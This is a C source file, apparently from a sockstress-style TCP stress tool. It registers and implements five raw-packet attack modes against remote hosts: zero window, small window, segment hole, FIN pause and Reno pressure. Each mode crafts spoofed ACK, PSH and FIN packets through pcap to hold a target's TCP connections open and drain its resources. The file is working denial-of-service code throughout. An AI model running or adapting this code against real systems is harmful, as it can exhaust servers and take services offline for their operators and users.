#include "config.h"
#include "ext/makepkt.h"
#include "ext/tcphash.h"
#include "ext/packet_slice.h"
#include "ext/xmalloc.h"
#include "ext/packets.h"
#include "ext/xdelay.h"
#include "misc.h"
#include "payload.h"

#include <pcap.h>

#include "attacks.h"
#include "main.h"

/*
 * 1 
 * dont forget to update attacks.h when you add things via ADD_FUNC here
 */
void init_attacks(void) {

#define ADD_FUNC(__fp, __fname, __opt) \
	assert(fl_off < MAX_FUNC_LIST_SIZE); \
	fl[fl_off]=xmalloc(sizeof(func_list_t)); \
	fl[fl_off]->name=__fname; \
	fl[fl_off]->opt=__opt; \
	fl[fl_off]->fp=__fp; \
	fl_off++

	ADD_FUNC(do_0window_stress, "zero window connection", 'z');
	ADD_FUNC(do_smlwnd_stress, "TCP small window", 'w');
	ADD_FUNC(do_ooseg_stress, "TCP Segment Hole", 's');
	ADD_FUNC(do_sillyface_stress, "TCP REQ FIN pause", 'S');
	ADD_FUNC(do_enablereno_stress, "TCP activate reno pressure", 'R');

}

#if 0
XXX Post SYN tcpoptions from same sources used in main.c
# timestamps processing causes some sort of issue inside the kernel with a timer
        if (tp->rx_opt.tstamp_ok) {
                *ptr++ = __constant_htonl((TCPOPT_NOP << 24) |
                                          (TCPOPT_NOP << 16) |
                                          (TCPOPT_TIMESTAMP << 8) |
                                          TCPOLEN_TIMESTAMP);
                *ptr++ = htonl(tstamp);
                *ptr++ = htonl(tp->rx_opt.ts_recent);
        }
        if (tp->rx_opt.eff_sacks) {
                struct tcp_sack_block *sp = tp->rx_opt.dsack ? tp->duplicate_sack : tp->selective_acks;
                int this_sack;

                *ptr++ = __constant_htonl((TCPOPT_NOP << 24) |
                                          (TCPOPT_NOP << 16) |
                                          (TCPOPT_SACK << 8) |
                                          (TCPOLEN_SACK_BASE +
                                           (tp->rx_opt.eff_sacks * TCPOLEN_SACK_PERBLOCK)));
                for(this_sack = 0; this_sack < tp->rx_opt.eff_sacks; this_sack++) {
                        *ptr++ = htonl(sp[this_sack].start_seq);
                        *ptr++ = htonl(sp[this_sack].end_seq);
                }
                if (tp->rx_opt.dsack) {
                        tp->rx_opt.dsack = 0;
                        tp->rx_opt.eff_sacks--;
                }
        }
#endif

void do_0window_stress(
			uint32_t rhost,
			uint32_t lhost,
			uint16_t rport,
			uint16_t lport,
			uint32_t ho_rwindow,
			uint32_t lseq,
			uint32_t rseq,
			uint32_t ts1,
			uint32_t ts2,
			int got_ts
		) {
	union {
		uint8_t *p;
		uint32_t *w;
		uint16_t *hw;
	} tcpo_u;
	uint8_t tcpopts[32], tcpopts_len=0;
	const uint8_t *packet=NULL;
	size_t packet_len=0;
	ssize_t xmit_len=0;

	tcpo_u.p=tcpopts;

	if (got_ts) {
		update_tickcnt();

		*tcpo_u.hw=0x0101;
		tcpo_u.hw++;	tcpopts_len += sizeof(*tcpo_u.hw);
		*tcpo_u.p=0x08;
		tcpo_u.p++;	tcpopts_len += sizeof(*tcpo_u.p);
		*tcpo_u.p=0x0a;
		tcpo_u.p++;	tcpopts_len += sizeof(*tcpo_u.p);
		*tcpo_u.w=tickcnt;
		tcpo_u.w++;	tcpopts_len += sizeof(*tcpo_u.w);
		*tcpo_u.w=ts1;
		tcpo_u.w++;	tcpopts_len += sizeof(*tcpo_u.w);
	}

	makepkt_clear();

	if (makepkt_build_ethernet(6, gwmac, ea, ETHERTYPE_IP) != 1) {
		return;
	}

	if (makepkt_build_ipv4(
			0x0				/* TOS			*/,
			(uint16_t )rand() & 0xffff	/* IPID			*/,
			IP_DF				/* frag			*/,
			0x64				/* TTL			*/,
			IPPROTO_TCP			/* proto		*/,
			0				/* chksum		*/,
			lhost				/* source		*/,
			rhost				/* dest			*/,
			NULL				/* ip options		*/,
			0				/* ip opt size		*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_build_tcp(
			ntohs(lport)			/* local_port		*/,
			ntohs(rport)			/* remote port		*/,
			0				/* chksum		*/,
			ntohl(lseq)			/* seq			*/,
			ntohl(rseq) + 1			/* ack seq		*/,
			TH_ACK				/* tcphdr flags		*/,
			0				/* window_size		*/,
			0				/* urgent pointer	*/,
			tcpopts				/* tcpoptions		*/,
			tcpopts_len			/* tcpoptions size	*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_getbuf(&packet_len, &packet) < 1) {
		return;
	}

	xmit_len=pcap_sendpacket(pdev, packet, packet_len);
	if (xmit_len != 0) {
		ERR("cant transmit packet, %zd was send size: %s", xmit_len, strerror(errno));
		_exit(1);
	}

	connections++;

	if (max_conns != -1 && connections >= max_conns) {
		_exit(0);
	}

	return;
}

void do_smlwnd_stress(
			uint32_t rhost,
			uint32_t lhost,
			uint16_t rport,
			uint16_t lport,
			uint32_t ho_rwindow,
			uint32_t lseq,
			uint32_t rseq,
			uint32_t ts1,
			uint32_t ts2,
			int got_ts
		) {
	union {
		uint8_t *p;
		uint32_t *w;
		uint16_t *hw;
	} tcpo_u;
	uint8_t tcpopts[32], tcpopts_len=0;
	const uint8_t *packet=NULL;
	size_t packet_len=0;
	ssize_t xmit_len=0;
	uint32_t *tc=NULL;
	const char *payload=NULL;
	size_t plen=0;

	payload=get_payload(rport, rhost, NULL);
	plen=strlen(payload);

	tcpo_u.p=tcpopts;

	if (got_ts) {
		update_tickcnt();

		*tcpo_u.hw=0x0101;
		tcpo_u.hw++;	tcpopts_len += sizeof(*tcpo_u.hw);
		*tcpo_u.p=0x08;
		tcpo_u.p++;	tcpopts_len += sizeof(*tcpo_u.p);
		*tcpo_u.p=0x0a;
		tcpo_u.p++;	tcpopts_len += sizeof(*tcpo_u.p);
		tc=tcpo_u.w;
		*tc=tickcnt;
		tcpo_u.w++;	tcpopts_len += sizeof(*tcpo_u.w);
		*tcpo_u.w=ts1;
		tcpo_u.w++;	tcpopts_len += sizeof(*tcpo_u.w);
	}

	makepkt_clear();

	if (makepkt_build_ethernet(6, gwmac, ea, ETHERTYPE_IP) != 1) {
		return;
	}

	if (makepkt_build_ipv4(
			0x0				/* TOS			*/,
			(uint16_t )rand() & 0xffff	/* IPID			*/,
			IP_DF				/* frag			*/,
			0x64				/* TTL			*/,
			IPPROTO_TCP			/* proto		*/,
			0				/* chksum		*/,
			lhost				/* source		*/,
			rhost				/* dest			*/,
			NULL				/* ip options		*/,
			0				/* ip opt size		*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_build_tcp(
			ntohs(lport)			/* local_port		*/,
			ntohs(rport)			/* remote port		*/,
			0				/* chksum		*/,
			ntohl(lseq)			/* seq			*/,
			ntohl(rseq) + 1			/* ack seq		*/,
			TH_ACK				/* tcphdr flags		*/,
			4				/* window_size		*/,
			0				/* urgent pointer	*/,
			tcpopts				/* tcpoptions		*/,
			tcpopts_len			/* tcpoptions size	*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_getbuf(&packet_len, &packet) < 1) {
		return;
	}

	xmit_len=pcap_sendpacket(pdev, packet, packet_len);
	if (xmit_len != 0) {
		ERR("cant transmit packet, %zd was send size: %s", xmit_len, strerror(errno));
		_exit(1);
	}

	makepkt_clear();

	if (got_ts) {
		tickcnt += 2;
		*tc=tickcnt;
	}

	if (makepkt_build_ethernet(6, gwmac, ea, ETHERTYPE_IP) != 1) {
		return;
	}

	if (makepkt_build_ipv4(
			0x0				/* TOS			*/,
			(uint16_t )rand() & 0xffff	/* IPID			*/,
			IP_DF				/* frag			*/,
			0x64				/* TTL			*/,
			IPPROTO_TCP			/* proto		*/,
			0				/* chksum		*/,
			lhost				/* source		*/,
			rhost				/* dest			*/,
			NULL				/* ip options		*/,
			0				/* ip opt size		*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_build_tcp(
			ntohs(lport)			/* local_port		*/,
			ntohs(rport)			/* remote port		*/,
			0				/* chksum		*/,
			ntohl(lseq)			/* seq			*/,
			ntohl(rseq) + 1			/* ack seq		*/,
			TH_ACK|TH_PSH			/* tcphdr flags		*/,
			4				/* window_size		*/,
			0				/* urgent pointer	*/,
			tcpopts				/* tcpoptions		*/,
			tcpopts_len			/* tcpoptions size	*/,
			payload				/* payload		*/,
			plen				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_getbuf(&packet_len, &packet) < 1) {
		return;
	}

	xmit_len=pcap_sendpacket(pdev, packet, packet_len);
	if (xmit_len != 0) {
		ERR("cant transmit packet, %zd was send size: %s", xmit_len, strerror(errno));
		_exit(1);
	}

	connections++;

	if (max_conns != -1 && connections >= max_conns) {
		exit(0);
	}

	return;
}

void do_ooseg_stress(
			uint32_t rhost,
			uint32_t lhost,
			uint16_t rport,
			uint16_t lport,
			uint32_t ho_rwindow,
			uint32_t lseq,
			uint32_t rseq,
			uint32_t ts1,
			uint32_t ts2,
			int got_ts
		) {
	union {
		uint8_t *p;
		uint32_t *w;
		uint16_t *hw;
	} tcpo_u;
	uint8_t tcpopts[32], tcpopts_len=0;
	uint32_t useq=0;
	const uint8_t *packet=NULL;
	size_t packet_len=0;
	ssize_t xmit_len=0;
	uint32_t *tc=NULL;

	tcpo_u.p=tcpopts;

	if (got_ts) {
		update_tickcnt();

		*tcpo_u.hw=0x0101;
		tcpo_u.hw++;	tcpopts_len += sizeof(*tcpo_u.hw);
		*tcpo_u.p=0x08;
		tcpo_u.p++;	tcpopts_len += sizeof(*tcpo_u.p);
		*tcpo_u.p=0x0a;
		tcpo_u.p++;	tcpopts_len += sizeof(*tcpo_u.p);
		tc=tcpo_u.w;
		*tc=tickcnt;
		tcpo_u.w++;	tcpopts_len += sizeof(*tcpo_u.w);
		*tcpo_u.w=ts1;
		tcpo_u.w++;	tcpopts_len += sizeof(*tcpo_u.w);
	}

	makepkt_clear();

	if (makepkt_build_ethernet(6, gwmac, ea, ETHERTYPE_IP) != 1) {
		return;
	}

	if (makepkt_build_ipv4(
			0x0				/* TOS			*/,
			(uint16_t )rand() & 0xffff	/* IPID			*/,
			IP_DF				/* frag			*/,
			0x64				/* TTL			*/,
			IPPROTO_TCP			/* proto		*/,
			0				/* chksum		*/,
			lhost				/* source		*/,
			rhost				/* dest			*/,
			NULL				/* ip options		*/,
			0				/* ip opt size		*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_build_tcp(
			ntohs(lport)			/* local_port		*/,
			ntohs(rport)			/* remote port		*/,
			0				/* chksum		*/,
			ntohl(lseq)			/* seq			*/,
			ntohl(rseq) + 1			/* ack seq		*/,
			TH_ACK				/* tcphdr flags		*/,
			0				/* window_size		*/,
			0				/* urgent pointer	*/,
			tcpopts				/* tcpoptions		*/,
			tcpopts_len			/* tcpoptions size	*/,
			"AAAA"				/* payload		*/,
			4				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_getbuf(&packet_len, &packet) < 1) {
		return;
	}

	xmit_len=pcap_sendpacket(pdev, packet, packet_len);
	if (xmit_len != 0) {
		ERR("cant transmit packet, %zd was send size: %s", xmit_len, strerror(errno));
		_exit(1);
	}

	makepkt_clear();

	if (got_ts) {
		tickcnt += 2;
		*tc=tickcnt;
	}

	if (makepkt_build_ethernet(6, gwmac, ea, ETHERTYPE_IP) != 1) {
		return;
	}

	if (makepkt_build_ipv4(
			0x0				/* TOS			*/,
			(uint16_t )rand() & 0xffff	/* IPID			*/,
			IP_DF				/* frag			*/,
			0x64				/* TTL			*/,
			IPPROTO_TCP			/* proto		*/,
			0				/* chksum		*/,
			lhost				/* source		*/,
			rhost				/* dest			*/,
			NULL				/* ip options		*/,
			0				/* ip opt size		*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return;
	}

	useq=ntohl(lseq);
	useq += ho_rwindow;
	useq++;
	useq -= 4;

	if (makepkt_build_tcp(
			ntohs(lport)			/* local_port		*/,
			ntohs(rport)			/* remote port		*/,
			0				/* chksum		*/,
			useq				/* seq			*/,
			ntohl(rseq)			/* ack seq		*/,
			TH_ACK|TH_PSH			/* tcphdr flags		*/,
			0				/* window_size		*/,
			0				/* urgent pointer	*/,
			tcpopts				/* tcpoptions		*/,
			tcpopts_len			/* tcpoptions size	*/,
			"AAAA"				/* payload		*/,
			4				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_getbuf(&packet_len, &packet) < 1) {
		return;
	}

	xmit_len=pcap_sendpacket(pdev, packet, packet_len);
	if (xmit_len != 0) {
		ERR("cant transmit packet, %zd was send size: %s", xmit_len, strerror(errno));
		_exit(1);
	}

	connections++;

	if (max_conns != -1 && connections >= max_conns) {
		exit(0);
	}

	return;
}

void do_sillyface_stress(
			uint32_t rhost,
			uint32_t lhost,
			uint16_t rport,
			uint16_t lport,
			uint32_t ho_rwindow,
			uint32_t lseq,
			uint32_t rseq,
			uint32_t ts1,
			uint32_t ts2,
			int got_ts
		) {
	union {
		uint8_t *p;
		uint32_t *w;
		uint16_t *hw;
	} tcpo_u;
	uint8_t tcpopts[32], tcpopts_len=0;
	const uint8_t *packet=NULL;
	size_t packet_len=0;
	ssize_t xmit_len=0;
	uint32_t *tc=NULL;
	const char *payload=NULL;
	size_t plen=0;

	payload=get_payload(rport, rhost, NULL);
	plen=strlen(payload);

	tcpo_u.p=tcpopts;

	if (got_ts) {
		update_tickcnt();

		*tcpo_u.hw=0x0101;
		tcpo_u.hw++;	tcpopts_len += sizeof(*tcpo_u.hw);
		*tcpo_u.p=0x08;
		tcpo_u.p++;	tcpopts_len += sizeof(*tcpo_u.p);
		*tcpo_u.p=0x0a;
		tcpo_u.p++;	tcpopts_len += sizeof(*tcpo_u.p);
		tc=tcpo_u.w;
		*tc=tickcnt;
		tcpo_u.w++;	tcpopts_len += sizeof(*tcpo_u.w);
		*tcpo_u.w=ts1;
		tcpo_u.w++;	tcpopts_len += sizeof(*tcpo_u.w);
	}

	makepkt_clear();

	if (makepkt_build_ethernet(6, gwmac, ea, ETHERTYPE_IP) != 1) {
		return;
	}

	if (makepkt_build_ipv4(
			0x0				/* TOS			*/,
			(uint16_t )rand() & 0xffff	/* IPID			*/,
			IP_DF				/* frag			*/,
			0x64				/* TTL			*/,
			IPPROTO_TCP			/* proto		*/,
			0				/* chksum		*/,
			lhost				/* source		*/,
			rhost				/* dest			*/,
			NULL				/* ip options		*/,
			0				/* ip opt size		*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_build_tcp(
			ntohs(lport)			/* local_port		*/,
			ntohs(rport)			/* remote port		*/,
			0				/* chksum		*/,
			ntohl(lseq)			/* seq			*/,
			ntohl(rseq) + 1			/* ack seq		*/,
			TH_ACK				/* tcphdr flags		*/,
			mywindow			/* window_size		*/,
			0				/* urgent pointer	*/,
			tcpopts				/* tcpoptions		*/,
			tcpopts_len			/* tcpoptions size	*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_getbuf(&packet_len, &packet) < 1) {
		return;
	}

	xmit_len=pcap_sendpacket(pdev, packet, packet_len);
	if (xmit_len != 0) {
		ERR("cant transmit packet, %zd was send size: %s", xmit_len, strerror(errno));
		_exit(1);
	}

	makepkt_clear();

	if (got_ts) {
		tickcnt += 2;
		*tc=tickcnt;
	}

	if (makepkt_build_ethernet(6, gwmac, ea, ETHERTYPE_IP) != 1) {
		return;
	}

	if (makepkt_build_ipv4(
			0x0				/* TOS			*/,
			(uint16_t )rand() & 0xffff	/* IPID			*/,
			IP_DF				/* frag			*/,
			0x64				/* TTL			*/,
			IPPROTO_TCP			/* proto		*/,
			0				/* chksum		*/,
			lhost				/* source		*/,
			rhost				/* dest			*/,
			NULL				/* ip options		*/,
			0				/* ip opt size		*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_build_tcp(
			ntohs(lport)			/* local_port		*/,
			ntohs(rport)			/* remote port		*/,
			0				/* chksum		*/,
			ntohl(lseq)			/* seq			*/,
			ntohl(rseq) + 1			/* ack seq		*/,
			TH_ACK|TH_PSH			/* tcphdr flags		*/,
			mywindow			/* window_size		*/,
			0				/* urgent pointer	*/,
			tcpopts				/* tcpoptions		*/,
			tcpopts_len			/* tcpoptions size	*/,
			payload				/* payload		*/,
			plen				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_getbuf(&packet_len, &packet) < 1) {
		return;
	}

	xmit_len=pcap_sendpacket(pdev, packet, packet_len);
	if (xmit_len != 0) {
		ERR("cant transmit packet, %zd was send size: %s", xmit_len, strerror(errno));
		_exit(1);
	}

	makepkt_clear();

	if (got_ts) {
		tickcnt += 2;
		*tc=tickcnt;
	}

	if (makepkt_build_ethernet(6, gwmac, ea, ETHERTYPE_IP) != 1) {
		return;
	}

	if (makepkt_build_ipv4(
			0x0				/* TOS			*/,
			(uint16_t )rand() & 0xffff	/* IPID			*/,
			IP_DF				/* frag			*/,
			0x64				/* TTL			*/,
			IPPROTO_TCP			/* proto		*/,
			0				/* chksum		*/,
			lhost				/* source		*/,
			rhost				/* dest			*/,
			NULL				/* ip options		*/,
			0				/* ip opt size		*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_build_tcp(
			ntohs(lport)			/* local_port		*/,
			ntohs(rport)			/* remote port		*/,
			0				/* chksum		*/,
			ntohl(lseq)			/* seq			*/,
			ntohl(rseq) + 1			/* ack seq		*/,
			TH_FIN				/* tcphdr flags		*/,
			0				/* window_size		*/,
			0				/* urgent pointer	*/,
			tcpopts				/* tcpoptions		*/,
			tcpopts_len			/* tcpoptions size	*/,
			payload				/* payload		*/,
			plen				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_getbuf(&packet_len, &packet) < 1) {
		return;
	}

	xmit_len=pcap_sendpacket(pdev, packet, packet_len);
	if (xmit_len != 0) {
		ERR("cant transmit packet, %zd was send size: %s", xmit_len, strerror(errno));
		_exit(1);
	}
	connections++;

	if (max_conns != -1 && connections >= max_conns) {
		exit(0);
	}

	return;
}

void do_enablereno_stress(
			uint32_t rhost,
			uint32_t lhost,
			uint16_t rport,
			uint16_t lport,
			uint32_t ho_rwindow,
			uint32_t lseq,
			uint32_t rseq,
			uint32_t ts1,
			uint32_t ts2,
			int got_ts
		) {
	union {
		uint8_t *p;
		uint32_t *w;
		uint16_t *hw;
	} tcpo_u;
	uint8_t tcpopts[32], tcpopts_len=0;
	const uint8_t *packet=NULL;
	size_t packet_len=0;
	ssize_t xmit_len=0;
	uint32_t *tc=NULL;
	const char *payload=NULL;
	size_t plen=0;
	int j=0;

	payload=get_payload(rport, rhost, NULL);
	plen=strlen(payload);

	tcpo_u.p=tcpopts;

	if (got_ts) {
		update_tickcnt();

		*tcpo_u.hw=0x0101;
		tcpo_u.hw++;	tcpopts_len += sizeof(*tcpo_u.hw);
		*tcpo_u.p=0x08;
		tcpo_u.p++;	tcpopts_len += sizeof(*tcpo_u.p);
		*tcpo_u.p=0x0a;
		tcpo_u.p++;	tcpopts_len += sizeof(*tcpo_u.p);
		tc=tcpo_u.w;
		*tc=tickcnt;
		tcpo_u.w++;	tcpopts_len += sizeof(*tcpo_u.w);
		*tcpo_u.w=ts1;
		tcpo_u.w++;	tcpopts_len += sizeof(*tcpo_u.w);
	}

	makepkt_clear();

	if (makepkt_build_ethernet(6, gwmac, ea, ETHERTYPE_IP) != 1) {
		return;
	}

	if (makepkt_build_ipv4(
			0x0				/* TOS			*/,
			(uint16_t )rand() & 0xffff	/* IPID			*/,
			IP_DF				/* frag			*/,
			0x64				/* TTL			*/,
			IPPROTO_TCP			/* proto		*/,
			0				/* chksum		*/,
			lhost				/* source		*/,
			rhost				/* dest			*/,
			NULL				/* ip options		*/,
			0				/* ip opt size		*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_build_tcp(
			ntohs(lport)			/* local_port		*/,
			ntohs(rport)			/* remote port		*/,
			0				/* chksum		*/,
			ntohl(lseq)			/* seq			*/,
			ntohl(rseq) + 1			/* ack seq		*/,
			TH_ACK				/* tcphdr flags		*/,
			mywindow			/* window_size		*/,
			0				/* urgent pointer	*/,
			tcpopts				/* tcpoptions		*/,
			tcpopts_len			/* tcpoptions size	*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_getbuf(&packet_len, &packet) < 1) {
		return;
	}

	xmit_len=pcap_sendpacket(pdev, packet, packet_len);
	if (xmit_len != 0) {
		ERR("cant transmit packet, %zd was send size: %s", xmit_len, strerror(errno));
		_exit(1);
	}

	makepkt_clear();

	if (got_ts) {
		tickcnt += 2;
		*tc=tickcnt;
	}

	if (makepkt_build_ethernet(6, gwmac, ea, ETHERTYPE_IP) != 1) {
		return;
	}

	if (makepkt_build_ipv4(
			0x0				/* TOS			*/,
			(uint16_t )rand() & 0xffff	/* IPID			*/,
			IP_DF				/* frag			*/,
			0x64				/* TTL			*/,
			IPPROTO_TCP			/* proto		*/,
			0				/* chksum		*/,
			lhost				/* source		*/,
			rhost				/* dest			*/,
			NULL				/* ip options		*/,
			0				/* ip opt size		*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_build_tcp(
			ntohs(lport)			/* local_port		*/,
			ntohs(rport)			/* remote port		*/,
			0				/* chksum		*/,
			ntohl(lseq)			/* seq			*/,
			ntohl(rseq) + 1			/* ack seq		*/,
			TH_ACK|TH_PSH			/* tcphdr flags		*/,
			mywindow			/* window_size		*/,
			0				/* urgent pointer	*/,
			tcpopts				/* tcpoptions		*/,
			tcpopts_len			/* tcpoptions size	*/,
			payload				/* payload		*/,
			plen				/* payload size		*/
		) != 1) {
		return;
	}

	if (makepkt_getbuf(&packet_len, &packet) < 1) {
		return;
	}

	xmit_len=pcap_sendpacket(pdev, packet, packet_len);
	if (xmit_len != 0) {
		ERR("cant transmit packet, %zd was send size: %s", xmit_len, strerror(errno));
		_exit(1);
	}

	if (got_ts) {
		tickcnt += 2;
		*tc=tickcnt;
	}

	for (j=0; j < 3; j++) {

		makepkt_clear();

		if (makepkt_build_ethernet(6, gwmac, ea, ETHERTYPE_IP) != 1) {
			return;
		}

		if (makepkt_build_ipv4(
			0x0				/* TOS			*/,
			(uint16_t )rand() & 0xffff	/* IPID			*/,
			IP_DF				/* frag			*/,
			0x64				/* TTL			*/,
			IPPROTO_TCP			/* proto		*/,
			0				/* chksum		*/,
			lhost				/* source		*/,
			rhost				/* dest			*/,
			NULL				/* ip options		*/,
			0				/* ip opt size		*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
			) != 1) {
			return;
		}

		if (makepkt_build_tcp(
			ntohs(lport)			/* local_port		*/,
			ntohs(rport)			/* remote port		*/,
			0				/* chksum		*/,
			ntohl(lseq)			/* seq			*/,
			ntohl(rseq) + 1			/* ack seq		*/,
			TH_ACK				/* tcphdr flags		*/,
			mywindow			/* window_size		*/,
			0				/* urgent pointer	*/,
			tcpopts				/* tcpoptions		*/,
			tcpopts_len			/* tcpoptions size	*/,
			NULL				/* payload		*/,
			0				/* payload size		*/
			) != 1) {
			return;
		}

		if (makepkt_getbuf(&packet_len, &packet) < 1) {
			return;
		}

		xmit_len=pcap_sendpacket(pdev, packet, packet_len);
		if (xmit_len != 0) {
			ERR("cant transmit packet, %zd was send size: %s", xmit_len, strerror(errno));
			_exit(1);
		}
	}

	connections++;

	if (max_conns != -1 && connections >= max_conns) {
		exit(0);
	}

	return;
}
